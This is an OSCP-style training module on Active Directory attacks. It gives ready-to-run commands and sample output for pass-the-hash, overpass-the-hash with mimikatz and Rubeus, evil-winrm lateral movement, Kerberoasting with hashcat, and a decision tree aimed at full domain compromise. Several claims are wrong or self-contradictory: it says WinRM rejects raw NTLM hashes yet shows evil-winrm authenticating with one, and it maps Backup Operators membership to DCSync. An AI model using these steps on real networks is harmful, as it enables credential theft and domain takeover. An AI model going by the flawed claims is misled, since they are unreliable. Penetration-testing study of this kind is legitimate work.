# Lateral Movement & Active Directory Attack Methodology

**Track:** Mastering OSCP
**Section:** Active Directory — 022
**Topics:** Pass-the-Hash vs. Overpass-the-Hash, PowerShell Remoting & WinRM, From Enumeration to Exploitation Mapping, End-to-End Kerberoasting Workflow, AD Attack Decision Tree, Reference Library

---

## 1. Lateral Movement: PtH vs. OPtH vs. WinRM/PSRemoting

Once valid credentials or hashes are in hand, the next question is *how* to actually move to another machine with them. There are three broadly distinct approaches, each suited to a different protocol and situation.

### 1.1 Pass-the-Hash (PtH)

Uses an NTLM hash **directly**, without ever cracking it, to authenticate over SMB/RPC. Works specifically against NTLM-based services.

**Linux:**

```bash
impacket-psexec corp.local/jdoe@10.10.10.15 -hashes :a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
```
```
[*] Requesting shares on 10.10.10.15.....
[*] Found writable share ADMIN$
[*] Uploading file XyZ123.exe
[*] Opening SVCManager on 10.10.10.15.....
[*] Creating service XyZ123 on 10.10.10.15.....
[*] Starting service XyZ123.....
C:\Windows\system32> whoami
corp\jdoe
```

**Windows:**

```cmd
mimikatz.exe "sekurlsa::pth /user:jdoe /domain:corp.local /ntlm:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /run:cmd.exe"
```
```
user    : jdoe
domain  : corp.local
program : cmd.exe
impers. : no
NTLM    : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
  |  PID  4520
  |  TID  4524
  |  LSA Process is now R/W
  |  LUID 0 ; 996 (00000000:000003e4)
  \_ msv1_0   - data copy @ 000001A2B3C4D5E6 : OK !
  \_ kerberos - data copy @ 000001A2B3C4D5E6 : OK !
```

### 1.2 Overpass-the-Hash (OPtH)

Converts an NTLM hash into a full **Kerberos TGT**, then authenticates via Kerberos rather than NTLM directly. This is *required* for protocols like WinRM/PSRemoting, which don't accept raw NTLM hashes the way SMB does.

**Windows (Mimikatz):**

```cmd
mimikatz.exe "sekurlsa::pth /user:jdoe /domain:corp.local /ntlm:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /run:powershell.exe"
```
```
[New PowerShell window opens with a Kerberos TGT already injected]
PS C:\> klist
Current LogonId is 0:0xb09a
Cached Tickets: (1)
#0>     Client: jdoe @ CORP.LOCAL
        Server: krbtgt/CORP.LOCAL @ CORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/5/2024 10:30:00 (local)
        End Time:   2/5/2024 20:30:00 (local)
        Renew Time: 2/12/2024 10:30:00 (local)
```

**Windows (Rubeus):**

```powershell
Rubeus.exe asktgt /user:jdoe /domain:corp.local /rc4:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /ptt
```
```
[*] Action: Ask TGT
[*] Using rc4_hmac hash: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
[*] Building AS-REQ (w/ preauth) for: 'corp.local\jdoe'
[*] Using domain controller: 10.10.10.10
[+] TGT request successful!
[*] base64(ticket.kirbi): doIF... [truncated]
[*] Action: Import Ticket
[+] Ticket successfully imported!
```

### 1.3 PowerShell Remoting & WinRM

| Tool | Protocol | Auth Type | Typical Use |
|---|---|---|---|
| `Enter-PSSession` | WinRM (5985/5986) | Kerberos/NTLM | Interactive remote session |
| `Invoke-Command` | WinRM | Kerberos/NTLM | Single scripted command/block |
| `winrs` | WinRM | NTLM/Kerberos | Lightweight CLI remoting |
| `evil-winrm` | WinRM | NTLM/Hash/Kerberos | The Linux-side standard for WinRM exploitation |

**Windows — `Enter-PSSession`:**

```powershell
Enter-PSSession -ComputerName FILE01.corp.local -Credential CORP\jdoe
```
```
[FILE01.corp.local]: PS C:\Users\jdoe\Documents> whoami
corp\jdoe
[FILE01.corp.local]: PS C:\Users\jdoe\Documents> hostname
FILE01
[FILE01.corp.local]: PS C:\Users\jdoe\Documents> exit
```

**Windows — `Invoke-Command`:**

```powershell
Invoke-Command -ComputerName FILE01.corp.local -ScriptBlock { whoami; hostname; ipconfig } -Credential CORP\jdoe
```
```
corp\jdoe
FILE01

Windows IP Configuration

Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . : corp.local
   IPv4 Address. . . . . . . . . . . : 10.10.10.15
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.1
```

**Windows — `winrs`:**

```cmd
winrs -r:FILE01.corp.local -u:CORP\jdoe -p:Password123! "whoami && hostname && systeminfo | findstr /B /C:"OS Name" /C:"OS Version""
```
```
corp\jdoe
FILE01
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
```

**Linux — `evil-winrm` (password auth):**

```bash
evil-winrm -i 10.10.10.15 -u jdoe -p 'Password123!'
```
```
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\jdoe\Documents> whoami
corp\jdoe
*Evil-WinRM* PS C:\Users\jdoe\Documents> hostname
FILE01
*Evil-WinRM* PS C:\Users\jdoe\Documents> exit
```

**Linux — `evil-winrm` (hash auth — the OPtH equivalent):**

```bash
evil-winrm -i 10.10.10.15 -u jdoe -H a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
```
```
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\jdoe\Documents> whoami
corp\jdoe
*Evil-WinRM* PS C:\Users\jdoe\Documents> Get-NetUser | Select-Object samaccountname
samaccountname
--------------
Administrator
jdoe
asmith
svc_backup
```

> **PtH** = NTLM only, works against SMB/RPC. **OPtH** = converts a hash into a Kerberos TGT, enabling WinRM/PSRemoting. Knowing when to reach for which is directly tested on OSCP. WinRM listens on port `5985` (HTTP) or `5986` (HTTPS) — always run `Test-WSMan` against a target before attempting PSRemoting. `evil-winrm` is the standard Linux-side tool for WinRM exploitation.

---

## 2. From Enumeration Finding to Exploitation Path

Every enumeration finding maps to a specific, well-known exploitation technique. Recognizing the finding is the hard part — the exploitation path that follows is usually mechanical once the finding is confirmed.

| Enumeration Finding | Exploitation Path |
|---|---|
| `userAccountControl: 4194304` (`DONT_REQ_PREAUTH`) | AS-REP Roasting → crack hash → login |
| `servicePrincipalName` set on a user account | Kerberoasting → request TGS → crack offline |
| User is a member of `Backup Operators` or `Domain Admins` | DCSync → extract every `NTDS.DIT` hash |
| Writable SYSVOL or Group Policy Preferences | GPP password decryption → credential reuse |
| `Find-LocalAdminAccess` returns workstations | Pass-the-Hash / Overpass-the-Hash → lateral movement |
| Unconstrained Delegation on a computer object | Printer Bug → force authentication → TGT theft |
| Constrained Delegation misconfiguration | S4U2Proxy → impersonate users against target services |
| `msDS-AllowedToActOnBehalfOfOtherIdentity` set | Resource-Based Constrained Delegation (RBCD) → forge S4U tickets |

---

## 3. Worked Example: Full Kerberoasting Workflow

Tying enumeration and exploitation together end-to-end, using the mapping above:

**Step 1 — find Kerberoastable accounts via PowerView:**

```powershell
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
```
```
samaccountname    serviceprincipalname
--------------    --------------------
svc_sql           MSSQLSvc/DB01.corp.local:1433
svc_exchange      exchangeMDB/MAIL01.corp.local
```

**Step 2 — request TGS tickets for those accounts, using Rubeus or Impacket:**

```bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.10 corp.local/jdoe:Password123!
```
```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/DB01.corp.local:1433*$<LONG_HASH>
```

**Step 3 — crack the recovered hash offline:**

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/DB01.corp.local:1433*$<LONG_HASH>:Summer2023!
```

Three commands, three tools, one clean path from "found an SPN" to a plaintext service account password.

---

## 4. AD Attack Decision Tree

A high-level way to think through an AD engagement, start to finish:

1. **Initial access / a credentialed user** is the starting point.
2. **Recon:** run an Nmap scan — confirm ports `389` (LDAP), `445` (SMB), and `88` (Kerberos) are open.
3. **Enumerate:** LDAP + SMB enumeration, then NetExec / PowerView for deeper detail.
4. **Branch on findings:**
   - `DONT_REQ_PREAUTH` users found → **AS-REP Roasting** → crack hash → new credentials.
   - SPNs on user accounts found → **Kerberoasting** → crack hash → new credentials.
   - Local admin on other machines found → **Pass-the-Hash / PsExec** → lateral movement.
   - Membership in `Backup Operators` / `Domain Admins` found → **DCSync** → extract every domain hash.
   - Writable SYSVOL/GPO found → **GPP password extraction** → credential reuse.
   - Delegation misconfigurations found → **Printer Bug / RBCD / S4U** → forge tickets → service access.
5. **Escalate:** with new credentials or forged tickets in hand, ask — do these grant higher privileges?
   - **Yes** → Domain Admin / Enterprise Admin → **full domain compromise**.
   - **No** → continue enumerating and pivoting from the new position, and repeat from step 3.

This loop — enumerate, find a misconfiguration, exploit it, re-enumerate from the new vantage point — is the core rhythm of essentially every AD engagement, from a 2-hour CTF box to a multi-week real-world assessment.

---

## 5. Reference Library

- Microsoft — [Active Directory Domain Services documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-domain-services)
- [PowerView Cheatsheet — HarmJ0y](https://github.com/HarmJ0y)
- [NetExec Documentation](https://www.netexec.wiki/)
- [BloodHound — AD Attack Path Mapping](https://bloodhound.readthedocs.io/)
- [Impacket — Protocol Exploitation Suite](https://github.com/fortra/impacket)
- [HackTricks — Active Directory Methodology](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings — Active Directory](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [MITRE ATT&CK — Credential Access & Lateral Movement](https://attack.mitre.org/)

### 5.1 Practice Environments

- HackTheBox Active Directory track: https://app.hackthebox.com/tracks/60
- GOAD (Game of Active Directory) — deployable vulnerable AD lab: https://github.com/Orange-Cyberdefense/GOAD
